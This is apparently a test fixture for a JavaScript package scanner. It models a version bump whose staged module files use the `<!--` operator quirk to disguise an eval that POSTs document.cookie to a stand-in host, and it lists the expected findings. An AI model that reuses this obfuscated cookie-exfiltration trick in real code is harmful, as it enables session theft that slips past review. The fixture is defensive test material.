@@ -1,0 +1,110 @@
+{
+  "id": "module-html-comment-template-eval",
+  "title": "Module hides a request behind `<!--`, which is an operator in module code",
+  "category": "obfuscated-dropper",
+  "intent": "In module code `a <!--b` is `a < !(--b)`, not an Annex B HTML-like comment. Read as a comment, it shifts every later template boundary, so the `//` line inside the evaluated template looks like a comment and the trailing `// `` ` line looks like a template. Any source containing `<!--` or `-->` keeps its raw text as the comment-blind view, whatever its declared module type. Safe: the host is example.invalid and the payload only names document.cookie.",
+  "previousPackageJson": {
+    "name": "module-html-comment-template-eval",
+    "version": "1.0.0",
+    "type": "module",
+    "main": "lib/b.js"
+  },
+  "stagedPackageJson": {
+    "name": "module-html-comment-template-eval",
+    "version": "1.0.1",
+    "type": "module",
+    "main": "lib/b.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 96,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"module-html-comment-template-eval\",\"version\":\"1.0.0\",\"type\":\"module\",\"main\":\"lib/b.js\"}"
+    },
+    {
+      "path": "lib/a.mjs",
+      "size": 19,
+      "sha256": "before-0",
+      "flags": [],
+      "textSample": "export const a = 1\n"
+    },
+    {
+      "path": "lib/b.js",
+      "size": 19,
+      "sha256": "before-1",
+      "flags": [],
+      "textSample": "export const b = 1\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 96,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"module-html-comment-template-eval\",\"version\":\"1.0.1\",\"type\":\"module\",\"main\":\"lib/b.js\"}"
+    },
+    {
+      "path": "lib/a.mjs",
+      "size": 201,
+      "sha256": "after-0",
+      "flags": [],
+      "textSample": "const target = 'https://example.invalid/c'\nconst init = { method: 'POST', body: document.cookie }\nlet t = '', a = 1, b = 1\nif (!(a <!--b)) t = `\n// fetch(target, init)\n`\neval(t.replace('//', ''))\n// `\n"
+    },
+    {
+      "path": "lib/b.js",
+      "size": 201,
+      "sha256": "after-1",
+      "flags": [],
+      "textSample": "const target = 'https://example.invalid/c'\nconst init = { method: 'POST', body: document.cookie }\nlet t = '', a = 1, b = 1\nif (!(a <!--b)) t = `\n// fetch(target, init)\n`\neval(t.replace('//', ''))\n// `\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/a.mjs"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/a.mjs"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/b.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/b.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/a.mjs"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/a.mjs"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/b.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/b.js"
+    }
+  ]
+}
